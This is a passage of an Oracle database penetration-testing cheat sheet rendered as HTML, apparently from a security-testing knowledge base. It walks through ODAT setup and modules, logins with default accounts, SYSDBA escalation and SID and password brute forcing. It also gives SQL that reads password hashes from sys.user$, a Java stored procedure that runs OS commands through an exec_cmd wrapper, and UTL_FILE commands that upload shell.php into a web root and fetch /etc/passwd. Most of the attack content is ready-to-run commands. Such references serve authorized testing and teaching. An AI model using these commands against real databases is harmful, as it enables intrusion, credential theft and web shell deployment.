</span><span id=__span-24-14><a id=__codelineno-24-14 name=__codelineno-24-14 href=#__codelineno-24-14></a><span class=w>            </span><span class=n>while</span><span class=w> </span><span class=p>((</span><span class=n>line</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>br</span><span class=p>.</span><span class=n>readLine</span><span class=p>())</span><span class=w> </span><span class=o>!=</span><span class=w> </span><span class=k>null</span><span class=p>)</span><span class=w> </span><span class=err>{</span>
</span><span id=__span-24-15><a id=__codelineno-24-15 name=__codelineno-24-15 href=#__codelineno-24-15></a><span class=w>                </span><span class=n>sb</span><span class=p>.</span><span class=n>append</span><span class=p>(</span><span class=n>line</span><span class=p>).</span><span class=n>append</span><span class=p>(</span><span class=ss>&quot;\n&quot;</span><span class=p>);</span>
</span><span id=__span-24-16><a id=__codelineno-24-16 name=__codelineno-24-16 href=#__codelineno-24-16></a><span class=w>            </span><span class=err>}</span>
</span><span id=__span-24-17><a id=__codelineno-24-17 name=__codelineno-24-17 href=#__codelineno-24-17></a><span class=w>            </span><span class=k>return</span><span class=w> </span><span class=n>sb</span><span class=p>.</span><span class=n>toString</span><span class=p>();</span>
</span><span id=__span-24-18><a id=__codelineno-24-18 name=__codelineno-24-18 href=#__codelineno-24-18></a><span class=w>        </span><span class=err>}</span><span class=w> </span><span class=n>catch</span><span class=w> </span><span class=p>(</span><span class=k>Exception</span><span class=w> </span><span class=n>e</span><span class=p>)</span><span class=w> </span><span class=err>{</span>
</span><span id=__span-24-19><a id=__codelineno-24-19 name=__codelineno-24-19 href=#__codelineno-24-19></a><span class=w>            </span><span class=k>return</span><span class=w> </span><span class=n>e</span><span class=p>.</span><span class=n>getMessage</span><span class=p>();</span>
</span><span id=__span-24-20><a id=__codelineno-24-20 name=__codelineno-24-20 href=#__codelineno-24-20></a><span class=w>        </span><span class=err>}</span>
</span><span id=__span-24-21><a id=__codelineno-24-21 name=__codelineno-24-21 href=#__codelineno-24-21></a><span class=w>    </span><span class=err>}</span>
</span><span id=__span-24-22><a id=__codelineno-24-22 name=__codelineno-24-22 href=#__codelineno-24-22></a><span class=err>}</span>
</span><span id=__span-24-23><a id=__codelineno-24-23 name=__codelineno-24-23 href=#__codelineno-24-23></a><span class=o>/</span>
</span><span id=__span-24-24><a id=__codelineno-24-24 name=__codelineno-24-24 href=#__codelineno-24-24></a>
</span><span id=__span-24-25><a id=__codelineno-24-25 name=__codelineno-24-25 href=#__codelineno-24-25></a><span class=c1>-- Create PL/SQL wrapper</span>
</span><span id=__span-24-26><a id=__codelineno-24-26 name=__codelineno-24-26 href=#__codelineno-24-26></a><span class=k>CREATE</span><span class=w> </span><span class=k>OR</span><span class=w> </span><span class=k>REPLACE</span><span class=w> </span><span class=k>FUNCTION</span><span class=w> </span><span class=n>exec_cmd</span><span class=p>(</span><span class=n>cmd</span><span class=w> </span><span class=n>VARCHAR2</span><span class=p>)</span><span class=w> </span><span class=k>RETURN</span><span class=w> </span><span class=n>VARCHAR2</span><span class=w> </span><span class=k>AS</span>
</span><span id=__span-24-27><a id=__codelineno-24-27 name=__codelineno-24-27 href=#__codelineno-24-27></a><span class=k>LANGUAGE</span><span class=w> </span><span class=n>JAVA</span><span class=w> </span><span class=n>NAME</span><span class=w> </span><span class=s1>&#39;CommandExec.execCmd(java.lang.String) return java.lang.String&#39;</span><span class=p>;</span>
</span><span id=__span-24-28><a id=__codelineno-24-28 name=__codelineno-24-28 href=#__codelineno-24-28></a><span class=o>/</span>
</span><span id=__span-24-29><a id=__codelineno-24-29 name=__codelineno-24-29 href=#__codelineno-24-29></a>
</span><span id=__span-24-30><a id=__codelineno-24-30 name=__codelineno-24-30 href=#__codelineno-24-30></a><span class=c1>-- Execute commands</span>
</span><span id=__span-24-31><a id=__codelineno-24-31 name=__codelineno-24-31 href=#__codelineno-24-31></a><span class=k>SELECT</span><span class=w> </span><span class=n>exec_cmd</span><span class=p>(</span><span class=s1>&#39;whoami&#39;</span><span class=p>)</span><span class=w> </span><span class=k>FROM</span><span class=w> </span><span class=n>dual</span><span class=p>;</span>
</span><span id=__span-24-32><a id=__codelineno-24-32 name=__codelineno-24-32 href=#__codelineno-24-32></a><span class=k>SELECT</span><span class=w> </span><span class=n>exec_cmd</span><span class=p>(</span><span class=s1>&#39;id&#39;</span><span class=p>)</span><span class=w> </span><span class=k>FROM</span><span class=w> </span><span class=n>dual</span><span class=p>;</span>
</span></code></pre></div> <hr> <h2 id=odat-framework>ODAT Framework<a class=headerlink href=#odat-framework title="Permanent link">&para;</a></h2> <h3 id=installation-and-setup>Installation and Setup<a class=headerlink href=#installation-and-setup title="Permanent link">&para;</a></h3> <div class="language-bash highlight"><pre><span></span><code><span id=__span-25-1><a id=__codelineno-25-1 name=__codelineno-25-1 href=#__codelineno-25-1></a><span class=c1># Download Oracle Instant Client</span>
</span><span id=__span-25-2><a id=__codelineno-25-2 name=__codelineno-25-2 href=#__codelineno-25-2></a>wget<span class=w> </span>https://download.oracle.com/otn_software/linux/instantclient/214000/instantclient-basic-linux.x64-21.4.0.0.0dbru.zip
</span><span id=__span-25-3><a id=__codelineno-25-3 name=__codelineno-25-3 href=#__codelineno-25-3></a>wget<span class=w> </span>https://download.oracle.com/otn_software/linux/instantclient/214000/instantclient-sqlplus-linux.x64-21.4.0.0.0dbru.zip
</span><span id=__span-25-4><a id=__codelineno-25-4 name=__codelineno-25-4 href=#__codelineno-25-4></a>
</span><span id=__span-25-5><a id=__codelineno-25-5 name=__codelineno-25-5 href=#__codelineno-25-5></a><span class=c1># Extract and configure</span>
</span><span id=__span-25-6><a id=__codelineno-25-6 name=__codelineno-25-6 href=#__codelineno-25-6></a>sudo<span class=w> </span>mkdir<span class=w> </span>-p<span class=w> </span>/opt/oracle
</span><span id=__span-25-7><a id=__codelineno-25-7 name=__codelineno-25-7 href=#__codelineno-25-7></a>sudo<span class=w> </span>unzip<span class=w> </span>-d<span class=w> </span>/opt/oracle<span class=w> </span>instantclient-basic-linux.x64-21.4.0.0.0dbru.zip
</span><span id=__span-25-8><a id=__codelineno-25-8 name=__codelineno-25-8 href=#__codelineno-25-8></a>sudo<span class=w> </span>unzip<span class=w> </span>-d<span class=w> </span>/opt/oracle<span class=w> </span>instantclient-sqlplus-linux.x64-21.4.0.0.0dbru.zip
</span><span id=__span-25-9><a id=__codelineno-25-9 name=__codelineno-25-9 href=#__codelineno-25-9></a><span class=nb>export</span><span class=w> </span><span class=nv>LD_LIBRARY_PATH</span><span class=o>=</span>/opt/oracle/instantclient_21_4:<span class=nv>$LD_LIBRARY_PATH</span>
</span><span id=__span-25-10><a id=__codelineno-25-10 name=__codelineno-25-10 href=#__codelineno-25-10></a>
</span><span id=__span-25-11><a id=__codelineno-25-11 name=__codelineno-25-11 href=#__codelineno-25-11></a><span class=c1># Clone and setup ODAT</span>
</span><span id=__span-25-12><a id=__codelineno-25-12 name=__codelineno-25-12 href=#__codelineno-25-12></a>git<span class=w> </span>clone<span class=w> </span>https://github.com/quentinhardy/odat.git
</span><span id=__span-25-13><a id=__codelineno-25-13 name=__codelineno-25-13 href=#__codelineno-25-13></a><span class=nb>cd</span><span class=w> </span>odat/
</span><span id=__span-25-14><a id=__codelineno-25-14 name=__codelineno-25-14 href=#__codelineno-25-14></a>pip3<span class=w> </span>install<span class=w> </span>cx_Oracle<span class=w> </span>python-libnmap<span class=w> </span>colorlog<span class=w> </span>termcolor<span class=w> </span>passlib<span class=w> </span>pycryptodome
</span></code></pre></div> <h3 id=odat-module-usage>ODAT Module Usage<a class=headerlink href=#odat-module-usage title="Permanent link">&para;</a></h3> <h4 id=comprehensive-testing>Comprehensive Testing<a class=headerlink href=#comprehensive-testing title="Permanent link">&para;</a></h4> <div class="language-bash highlight"><pre><span></span><code><span id=__span-26-1><a id=__codelineno-26-1 name=__codelineno-26-1 href=#__codelineno-26-1></a><span class=c1># Test all modules</span>
</span><span id=__span-26-2><a id=__codelineno-26-2 name=__codelineno-26-2 href=#__codelineno-26-2></a>./odat.py<span class=w> </span>all<span class=w> </span>-s<span class=w> </span>target<span class=w> </span>-d<span class=w> </span>XE<span class=w> </span>-U<span class=w> </span>scott<span class=w> </span>-P<span class=w> </span>tiger
</span><span id=__span-26-3><a id=__codelineno-26-3 name=__codelineno-26-3 href=#__codelineno-26-3></a>
</span><span id=__span-26-4><a id=__codelineno-26-4 name=__codelineno-26-4 href=#__codelineno-26-4></a><span class=c1># Test specific functionality</span>
</span><span id=__span-26-5><a id=__codelineno-26-5 name=__codelineno-26-5 href=#__codelineno-26-5></a>./odat.py<span class=w> </span>all<span class=w> </span>-s<span class=w> </span>target<span class=w> </span>-d<span class=w> </span>XE<span class=w> </span>-U<span class=w> </span>scott<span class=w> </span>-P<span class=w> </span>tiger<span class=w> </span>--sysdba
</span><span id=__span-26-6><a id=__codelineno-26-6 name=__codelineno-26-6 href=#__codelineno-26-6></a>
</span><span id=__span-26-7><a id=__codelineno-26-7 name=__codelineno-26-7 href=#__codelineno-26-7></a><span class=c1># Verbose output</span>
</span><span id=__span-26-8><a id=__codelineno-26-8 name=__codelineno-26-8 href=#__codelineno-26-8></a>./odat.py<span class=w> </span>all<span class=w> </span>-s<span class=w> </span>target<span class=w> </span>-d<span class=w> </span>XE<span class=w> </span>-U<span class=w> </span>scott<span class=w> </span>-P<span class=w> </span>tiger<span class=w> </span>-v
</span></code></pre></div> <h4 id=specific-module-testing>Specific Module Testing<a class=headerlink href=#specific-module-testing title="Permanent link">&para;</a></h4> <div class="language-bash highlight"><pre><span></span><code><span id=__span-27-1><a id=__codelineno-27-1 name=__codelineno-27-1 href=#__codelineno-27-1></a><span class=c1># SID guessing</span>
</span><span id=__span-27-2><a id=__codelineno-27-2 name=__codelineno-27-2 href=#__codelineno-27-2></a>./odat.py<span class=w> </span>sidguesser<span class=w> </span>-s<span class=w> </span>target
</span><span id=__span-27-3><a id=__codelineno-27-3 name=__codelineno-27-3 href=#__codelineno-27-3></a>
</span><span id=__span-27-4><a id=__codelineno-27-4 name=__codelineno-27-4 href=#__codelineno-27-4></a><span class=c1># Password guessing</span>
</span><span id=__span-27-5><a id=__codelineno-27-5 name=__codelineno-27-5 href=#__codelineno-27-5></a>./odat.py<span class=w> </span>passwordguesser<span class=w> </span>-s<span class=w> </span>target<span class=w> </span>-d<span class=w> </span>XE
</span><span id=__span-27-6><a id=__codelineno-27-6 name=__codelineno-27-6 href=#__codelineno-27-6></a>
</span><span id=__span-27-7><a id=__codelineno-27-7 name=__codelineno-27-7 href=#__codelineno-27-7></a><span class=c1># File operations</span>
</span><span id=__span-27-8><a id=__codelineno-27-8 name=__codelineno-27-8 href=#__codelineno-27-8></a>./odat.py<span class=w> </span>utlfile<span class=w> </span>-s<span class=w> </span>target<span class=w> </span>-d<span class=w> </span>XE<span class=w> </span>-U<span class=w> </span>scott<span class=w> </span>-P<span class=w> </span>tiger<span class=w> </span>--test-all
</span><span id=__span-27-9><a id=__codelineno-27-9 name=__codelineno-27-9 href=#__codelineno-27-9></a>
</span><span id=__span-27-10><a id=__codelineno-27-10 name=__codelineno-27-10 href=#__codelineno-27-10></a><span class=c1># HTTP operations</span>
</span><span id=__span-27-11><a id=__codelineno-27-11 name=__codelineno-27-11 href=#__codelineno-27-11></a>./odat.py<span class=w> </span>utlhttp<span class=w> </span>-s<span class=w> </span>target<span class=w> </span>-d<span class=w> </span>XE<span class=w> </span>-U<span class=w> </span>scott<span class=w> </span>-P<span class=w> </span>tiger<span class=w> </span>--test-all
</span><span id=__span-27-12><a id=__codelineno-27-12 name=__codelineno-27-12 href=#__codelineno-27-12></a>
</span><span id=__span-27-13><a id=__codelineno-27-13 name=__codelineno-27-13 href=#__codelineno-27-13></a><span class=c1># Java exploitation</span>
</span><span id=__span-27-14><a id=__codelineno-27-14 name=__codelineno-27-14 href=#__codelineno-27-14></a>./odat.py<span class=w> </span>java<span class=w> </span>-s<span class=w> </span>target<span class=w> </span>-d<span class=w> </span>XE<span class=w> </span>-U<span class=w> </span>scott<span class=w> </span>-P<span class=w> </span>tiger<span class=w> </span>--test-all
</span></code></pre></div> <hr> <h2 id=common-vulnerabilities>Common Vulnerabilities<a class=headerlink href=#common-vulnerabilities title="Permanent link">&para;</a></h2> <h3 id=default-credentials>Default Credentials<a class=headerlink href=#default-credentials title="Permanent link">&para;</a></h3> <div class="language-bash highlight"><pre><span></span><code><span id=__span-28-1><a id=__codelineno-28-1 name=__codelineno-28-1 href=#__codelineno-28-1></a><span class=c1># VULNERABILITY: Default Oracle accounts</span>
</span><span id=__span-28-2><a id=__codelineno-28-2 name=__codelineno-28-2 href=#__codelineno-28-2></a>sqlplus<span class=w> </span>system/manager@target:1521/XE
</span><span id=__span-28-3><a id=__codelineno-28-3 name=__codelineno-28-3 href=#__codelineno-28-3></a>sqlplus<span class=w> </span>scott/tiger@target:1521/XE
</span><span id=__span-28-4><a id=__codelineno-28-4 name=__codelineno-28-4 href=#__codelineno-28-4></a>sqlplus<span class=w> </span>hr/hr@target:1521/XE
</span><span id=__span-28-5><a id=__codelineno-28-5 name=__codelineno-28-5 href=#__codelineno-28-5></a>
</span><span id=__span-28-6><a id=__codelineno-28-6 name=__codelineno-28-6 href=#__codelineno-28-6></a><span class=c1># VULNERABILITY: Default DBSNMP account</span>
</span><span id=__span-28-7><a id=__codelineno-28-7 name=__codelineno-28-7 href=#__codelineno-28-7></a>sqlplus<span class=w> </span>dbsnmp/dbsnmp@target:1521/XE
</span></code></pre></div> <h3 id=privilege-escalation>Privilege Escalation<a class=headerlink href=#privilege-escalation title="Permanent link">&para;</a></h3> <div class="language-sql highlight"><pre><span></span><code><span id=__span-29-1><a id=__codelineno-29-1 name=__codelineno-29-1 href=#__codelineno-29-1></a><span class=c1>-- VULNERABILITY: SYSDBA access with regular account</span>
</span><span id=__span-29-2><a id=__codelineno-29-2 name=__codelineno-29-2 href=#__codelineno-29-2></a><span class=n>sqlplus</span><span class=w> </span><span class=n>scott</span><span class=o>/</span><span class=n>tiger</span><span class=o>@</span><span class=n>target</span><span class=p>:</span><span class=mi>1521</span><span class=o>/</span><span class=n>XE</span><span class=w> </span><span class=k>as</span><span class=w> </span><span class=n>sysdba</span>
</span><span id=__span-29-3><a id=__codelineno-29-3 name=__codelineno-29-3 href=#__codelineno-29-3></a>
</span><span id=__span-29-4><a id=__codelineno-29-4 name=__codelineno-29-4 href=#__codelineno-29-4></a><span class=c1>-- Check if successful escalation</span>
</span><span id=__span-29-5><a id=__codelineno-29-5 name=__codelineno-29-5 href=#__codelineno-29-5></a><span class=k>SELECT</span><span class=w> </span><span class=o>*</span><span class=w> </span><span class=k>FROM</span><span class=w> </span><span class=n>user_role_privs</span><span class=p>;</span>
</span><span id=__span-29-6><a id=__codelineno-29-6 name=__codelineno-29-6 href=#__codelineno-29-6></a><span class=c1>-- Result shows SYS privileges instead of SCOTT</span>
</span></code></pre></div> <h3 id=information-disclosure>Information Disclosure<a class=headerlink href=#information-disclosure title="Permanent link">&para;</a></h3> <div class="language-sql highlight"><pre><span></span><code><span id=__span-30-1><a id=__codelineno-30-1 name=__codelineno-30-1 href=#__codelineno-30-1></a><span class=c1>-- VULNERABILITY: Access to sensitive system tables</span>
</span><span id=__span-30-2><a id=__codelineno-30-2 name=__codelineno-30-2 href=#__codelineno-30-2></a><span class=k>SELECT</span><span class=w> </span><span class=o>*</span><span class=w> </span><span class=k>FROM</span><span class=w> </span><span class=n>dba_users</span><span class=p>;</span>
</span><span id=__span-30-3><a id=__codelineno-30-3 name=__codelineno-30-3 href=#__codelineno-30-3></a><span class=k>SELECT</span><span class=w> </span><span class=n>name</span><span class=p>,</span><span class=w> </span><span class=n>password</span><span class=w> </span><span class=k>FROM</span><span class=w> </span><span class=n>sys</span><span class=p>.</span><span class=k>user</span><span class=err>$</span><span class=p>;</span>
</span><span id=__span-30-4><a id=__codelineno-30-4 name=__codelineno-30-4 href=#__codelineno-30-4></a>
</span><span id=__span-30-5><a id=__codelineno-30-5 name=__codelineno-30-5 href=#__codelineno-30-5></a><span class=c1>-- VULNERABILITY: Database configuration exposure</span>
</span><span id=__span-30-6><a id=__codelineno-30-6 name=__codelineno-30-6 href=#__codelineno-30-6></a><span class=k>SELECT</span><span class=w> </span><span class=o>*</span><span class=w> </span><span class=k>FROM</span><span class=w> </span><span class=n>v$parameter</span><span class=p>;</span>
</span></code></pre></div> <h3 id=file-system-access>File System Access<a class=headerlink href=#file-system-access title="Permanent link">&para;</a></h3> <div class="language-bash highlight"><pre><span></span><code><span id=__span-31-1><a id=__codelineno-31-1 name=__codelineno-31-1 href=#__codelineno-31-1></a><span class=c1># VULNERABILITY: File upload capabilities</span>
</span><span id=__span-31-2><a id=__codelineno-31-2 name=__codelineno-31-2 href=#__codelineno-31-2></a>./odat.py<span class=w> </span>utlfile<span class=w> </span>-s<span class=w> </span>target<span class=w> </span>-d<span class=w> </span>XE<span class=w> </span>-U<span class=w> </span>scott<span class=w> </span>-P<span class=w> </span>tiger<span class=w> </span>--putFile<span class=w> </span>/var/www/html<span class=w> </span>shell.php<span class=w> </span>./shell.php
</span><span id=__span-31-3><a id=__codelineno-31-3 name=__codelineno-31-3 href=#__codelineno-31-3></a>
</span><span id=__span-31-4><a id=__codelineno-31-4 name=__codelineno-31-4 href=#__codelineno-31-4></a><span class=c1># VULNERABILITY: File download capabilities</span>
</span><span id=__span-31-5><a id=__codelineno-31-5 name=__codelineno-31-5 href=#__codelineno-31-5></a>./odat.py<span class=w> </span>utlfile<span class=w> </span>-s<span class=w> </span>target<span class=w> </span>-d<span class=w> </span>XE<span class=w> </span>-U<span class=w> </span>scott<span class=w> </span>-P<span class=w> </span>tiger<span class=w> </span>--getFile<span class=w> </span>/etc/passwd<span class=w> </span>passwd.txt
</span></code></pre></div> <hr> <h2 id=quick-reference-commands>Quick Reference Commands<a class=headerlink href=#quick-reference-commands title="Permanent link">&para;</a></h2> <h3 id=discovery>Discovery<a class=headerlink href=#discovery title="Permanent link">&para;</a></h3> <div class="language-bash highlight"><pre><span></span><code><span id=__span-32-1><a id=__codelineno-32-1 name=__codelineno-32-1 href=#__codelineno-32-1></a>nmap<span class=w> </span>-p<span class=w> </span><span class=m>1521</span><span class=w> </span>--script<span class=o>=</span>oracle-sid-brute<span class=w> </span>target
</span><span id=__span-32-2><a id=__codelineno-32-2 name=__codelineno-32-2 href=#__codelineno-32-2></a>./odat.py<span class=w> </span>sidguesser<span class=w> </span>-s<span class=w> </span>target
</span><span id=__span-32-3><a id=__codelineno-32-3 name=__codelineno-32-3 href=#__codelineno-32-3></a>sqlplus<span class=w> </span>system/manager@target:1521/XE
</span></code></pre></div> <h3 id=authentication>Authentication<a class=headerlink href=#authentication title="Permanent link">&para;</a></h3> <div class="language-bash highlight"><pre><span></span><code><span id=__span-33-1><a id=__codelineno-33-1 name=__codelineno-33-1 href=#__codelineno-33-1></a>./odat.py<span class=w> </span>passwordguesser<span class=w> </span>-s<span class=w> </span>target<span class=w> </span>-d<span class=w> </span>XE<span class=w> </span>-U<span class=w> </span>system
</span><span id=__span-33-2><a id=__codelineno-33-2 name=__codelineno-33-2 href=#__codelineno-33-2></a>hydra<span class=w> </span>-L<span class=w> </span>users.txt<span class=w> </span>-P<span class=w> </span>passwords.txt<span class=w> </span>oracle-listener://target
</span><span id=__span-33-3><a id=__codelineno-33-3 name=__codelineno-33-3 href=#__codelineno-33-3></a>sqlplus<span class=w> </span>scott/tiger@target:1521/XE<span class=w> </span>as<span class=w> </span>sysdba
</span></code></pre></div> <h3 id=enumeration>Enumeration<a class=headerlink href=#enumeration title="Permanent link">&para;</a></h3> <div class="language-sql highlight"><pre><span></span><code><span id=__span-34-1><a id=__codelineno-34-1 name=__codelineno-34-1 href=#__codelineno-34-1></a><span class=k>SELECT</span><span class=w> </span><span class=o>*</span><span class=w> </span><span class=k>FROM</span><span class=w> </span><span class=n>v$version</span><span class=p>;</span>
</span><span id=__span-34-2><a id=__codelineno-34-2 name=__codelineno-34-2 href=#__codelineno-34-2></a><span class=k>SELECT</span><span class=w> </span><span class=o>*</span><span class=w> </span><span class=k>FROM</span><span class=w> </span><span class=n>user_role_privs</span><span class=p>;</span>
</span><span id=__span-34-3><a id=__codelineno-34-3 name=__codelineno-34-3 href=#__codelineno-34-3></a><span class=k>SELECT</span><span class=w> </span><span class=k>table_name</span><span class=w> </span><span class=k>FROM</span><span class=w> </span><span class=n>all_tables</span><span class=p>;</span>
</span><span id=__span-34-4><a id=__codelineno-34-4 name=__codelineno-34-4 href=#__codelineno-34-4></a><span class=k>SELECT</span><span class=w> </span><span class=n>name</span><span class=p>,</span><span class=w> </span><span class=n>password</span><span class=w> </span><span class=k>FROM</span><span class=w> </span><span class=n>sys</span><span class=p>.</span><span class=k>user</span><span class=err>$</span><span class=p>;</span>
</span></code></pre></div> <h3 id=file-operations>File Operations<a class=headerlink href=#file-operations title="Permanent link">&para;</a></h3> <div class="language-bash highlight"><pre><span></span><code><span id=__span-35-1><a id=__codelineno-35-1 name=__codelineno-35-1 href=#__codelineno-35-1></a>./odat.py<span class=w> </span>utlfile<span class=w> </span>-s<span class=w> </span>target<span class=w> </span>-d<span class=w> </span>XE<span class=w> </span>-U<span class=w> </span>scott<span class=w> </span>-P<span class=w> </span>tiger<span class=w> </span>--putFile<span class=w> </span>/path/file.php<span class=w> </span>./file.php
</span><span id=__span-35-2><a id=__codelineno-35-2 name=__codelineno-35-2 href=#__codelineno-35-2></a>./odat.py<span class=w> </span>utlfile<span class=w> </span>-s<span class=w> </span>target<span class=w> </span>-d<span class=w> </span>XE<span class=w> </span>-U<span class=w> </span>scott<span class=w> </span>-P<span class=w> </span>tiger<span class=w> </span>--getFile<span class=w> </span>/etc/passwd<span class=w> </span>passwd.txt
</span></code></pre></div> <hr> <h2 id=testing-checklist>Testing Checklist<a class=headerlink href=#testing-checklist title="Permanent link">&para;</a></h2> <h4 id=discovery-detection>Discovery &amp; Detection<a class=headerlink href=#discovery-detection title="Permanent link">&para;</a></h4> <ul class=task-list> <li class=task-list-item><label class=task-list-control><input type=checkbox disabled><span class=task-list-indicator></span></label> Port 1521 open and accessible</li> <li class=task-list-item><label class=task-list-control><input type=checkbox disabled><span class=task-list-indicator></span></label> Oracle TNS version identification</li> <li class=task-list-item><label class=task-list-control><input type=checkbox disabled><span class=task-list-indicator></span></label> Alternative port discovery</li> <li class=task-list-item><label class=task-list-control><input type=checkbox disabled><span class=task-list-indicator></span></label> Service banner analysis</li> </ul> <h4 id=sid-enumeration>SID Enumeration<a class=headerlink href=#sid-enumeration title="Permanent link">&para;</a></h4> <ul class=task-list> <li class=task-list-item><label class=task-list-control><input type=checkbox disabled><span class=task-list-indicator></span></label> Default SID testing (XE, ORCL)</li> <li class=task-list-item><label class=task-list-control><input type=checkbox disabled><span class=task-list-indicator></span></label> SID brute force attacks</li> <li class=task-list-item><label class=task-list-control><input type=checkbox disabled><span class=task-list-indicator></span></label> Custom SID wordlist testing</li> <li class=task-list-item><label class=task-list-control><input type=checkbox disabled><span class=task-list-indicator></span></label> Service name enumeration</li> </ul> <h4 id=authentication-testing>Authentication Testing<a class=headerlink href=#authentication-testing title="Permanent link">&para;</a></h4> <ul class=task-list> <li class=task-list-item><label class=task-list-control><input type=checkbox disabled><span class=task-list-indicator></span></label> Default credential testing</li> <li class=task-list-item><label class=task-list-control><input type=checkbox disabled><span class=task-list-indicator></span></label> Password brute force attacks</li> <li class=task-list-item><label class=task-list-control><input type=checkbox disabled><span class=task-list-indicator></span></label> Account status verification</li> <li class=task-list-item><label class=task-list-control><input type=checkbox disabled><span class=task-list-indicator></span></label> SYSDBA privilege testing</li> </ul> <h4 id=database-enumeration>Database Enumeration<a class=headerlink href=#database-enumeration title="Permanent link">&para;</a></h4> <ul class=task-list> <li class=task-list-item><label class=task-list-control><input type=checkbox disabled><span class=task-list-indicator></span></label> Schema and table discovery</li> <li class=task-list-item><label class=task-list-control><input type=checkbox disabled><span class=task-list-indicator></span></label> User and privilege enumeration</li> <li class=task-list-item><label class=task-list-control><input type=checkbox disabled><span class=task-list-indicator></span></label> System configuration analysis</li> <li class=task-list-item><label class=task-list-control><input type=checkbox disabled><span class=task-list-indicator></span></label> Sensitive data identification</li> </ul> <h4 id=file-system-testing>File System Testing<a class=headerlink href=#file-system-testing title="Permanent link">&para;</a></h4> <ul class=task-list> <li class=task-list-item><label class=task-list-control><input type=checkbox disabled><span class=task-list-indicator></span></label> File upload capabilities</li> <li class=task-list-item><label class=task-list-control><input type=checkbox disabled><span class=task-list-indicator></span></label> File download testing</li> <li class=task-list-item><label class=task-list-control><input type=checkbox disabled><span class=task-list-indicator></span></label> Directory traversal attempts</li> <li class=task-list-item><label class=task-list-control><input type=checkbox disabled><span class=task-list-indicator></span></label> Web shell deployment</li> </ul> <hr> <h2 id=critical-security-issues>Critical Security Issues<a class=headerlink href=#critical-security-issues title="Permanent link">&para;</a></h2> <h3 id=default-credentials_1>Default Credentials<a class=headerlink href=#default-credentials_1 title="Permanent link">&para;</a></h3> <ul> <li><strong>Impact</strong>: Full database access, privilege escalation</li> <li><strong>Detection</strong>: Successful login with default accounts</li> <li><strong>Exploitation</strong>: <code>sqlplus system/manager@target:1521/XE</code></li> </ul> <h3 id=sysdba-privilege-escalation>SYSDBA Privilege Escalation<a class=headerlink href=#sysdba-privilege-escalation title="Permanent link">&para;</a></h3> <ul> <li><strong>Impact</strong>: Complete database administrative access</li> <li><strong>Detection</strong>: Regular user can connect as SYSDBA</li> <li><strong>Exploitation</strong>: <code>sqlplus scott/tiger@target:1521/XE as sysdba</code></li> </ul> <h3 id=file-system-access_1>File System Access<a class=headerlink href=#file-system-access_1 title="Permanent link">&para;</a></h3> <ul> <li><strong>Impact</strong>: Web shell upload, sensitive file disclosure</li> <li><strong>Detection</strong>: Successful file operations via UTL_FILE</li> <li><strong>Exploitation</strong>: Web shell deployment, configuration file access</li> </ul> <h3 id=information-disclosure_1>Information Disclosure<a class=headerlink href=#information-disclosure_1 title="Permanent link">&para;</a></h3> <ul> <li><strong>Impact</strong>: Password hash exposure, sensitive data access</li> <li><strong>Detection</strong>: Access to sys.user$ and other system tables</li> <li><strong>Exploitation</strong>: Password cracking, data exfiltration</li> </ul> <h3 id=network-exposure>Network Exposure<a class=headerlink href=#network-exposure title="Permanent link">&para;</a></h3> <ul> <li><strong>Impact</strong>: Remote database access, increased attack surface</li> <li><strong>Detection</strong>: TNS listener accessible from external networks</li> <li><strong>Exploitation</strong>: Remote enumeration and exploitation</li> </ul> <hr> <h2 id=common-oracle-sids>Common Oracle SIDs<a class=headerlink href=#common-oracle-sids title="Permanent link">&para;</a></h2> <h3 id=default-sids>Default SIDs<a class=headerlink href=#default-sids title="Permanent link">&para;</a></h3> <div class="language-text highlight"><pre><span></span><code><span id=__span-36-1><a id=__codelineno-36-1 name=__codelineno-36-1 href=#__codelineno-36-1></a>XE          - Oracle Express Edition
</span><span id=__span-36-2><a id=__codelineno-36-2 name=__codelineno-36-2 href=#__codelineno-36-2></a>ORCL        - Oracle Database
</span><span id=__span-36-3><a id=__codelineno-36-3 name=__codelineno-36-3 href=#__codelineno-36-3></a>PLSExtProc  - PL/SQL External Procedures
</span><span id=__span-36-4><a id=__codelineno-36-4 name=__codelineno-36-4 href=#__codelineno-36-4></a>XEXDB       - Oracle XE XML Database
</span></code></pre></div> <h3 id=enterprise-sids>Enterprise SIDs<a class=headerlink href=#enterprise-sids title="Permanent link">&para;</a></h3> <div class="language-text highlight"><pre><span></span><code><span id=__span-37-1><a id=__codelineno-37-1 name=__codelineno-37-1 href=#__codelineno-37-1></a>PROD        - Production database
</span><span id=__span-37-2><a id=__codelineno-37-2 name=__codelineno-37-2 href=#__codelineno-37-2></a>DEV         - Development database
</span><span id=__span-37-3><a id=__codelineno-37-3 name=__codelineno-37-3 href=#__codelineno-37-3></a>TEST        - Testing database
</span><span id=__span-37-4><a id=__codelineno-37-4 name=__codelineno-37-4 href=#__codelineno-37-4></a>STAGE       - Staging database
</span><span id=__span-37-5><a id=__codelineno-37-5 name=__codelineno-37-5 href=#__codelineno-37-5></a>DB01        - Generic database naming
</span></code></pre></div> <hr> <h2 id=default-oracle-accounts>Default Oracle Accounts<a class=headerlink href=#default-oracle-accounts title="Permanent link">&para;</a></h2> <h3 id=system-accounts>System Accounts<a class=headerlink href=#system-accounts title="Permanent link">&para;</a></h3> <div class="language-text highlight"><pre><span></span><code><span id=__span-38-1><a id=__codelineno-38-1 name=__codelineno-38-1 href=#__codelineno-38-1></a>sys/change_on_install   - System administrator
</span><span id=__span-38-2><a id=__codelineno-38-2 name=__codelineno-38-2 href=#__codelineno-38-2></a>system/manager         - System DBA
</span><span id=__span-38-3><a id=__codelineno-38-3 name=__codelineno-38-3 href=#__codelineno-38-3></a>sysman/sysman          - Enterprise Manager
</span><span id=__span-38-4><a id=__codelineno-38-4 name=__codelineno-38-4 href=#__codelineno-38-4></a>dbsnmp/dbsnmp          - SNMP monitoring
</span></code></pre></div> <h3 id=application-accounts>Application Accounts<a class=headerlink href=#application-accounts title="Permanent link">&para;</a></h3> <div class="language-text highlight"><pre><span></span><code><span id=__span-39-1><a id=__codelineno-39-1 name=__codelineno-39-1 href=#__codelineno-39-1></a>scott/tiger            - Sample schema
</span><span id=__span-39-2><a id=__codelineno-39-2 name=__codelineno-39-2 href=#__codelineno-39-2></a>hr/hr                  - Human Resources schema
</span><span id=__span-39-3><a id=__codelineno-39-3 name=__codelineno-39-3 href=#__codelineno-39-3></a>oe/oe                  - Order Entry schema
</span><span id=__span-39-4><a id=__codelineno-39-4 name=__codelineno-39-4 href=#__codelineno-39-4></a>sh/sh                  - Sales History schema
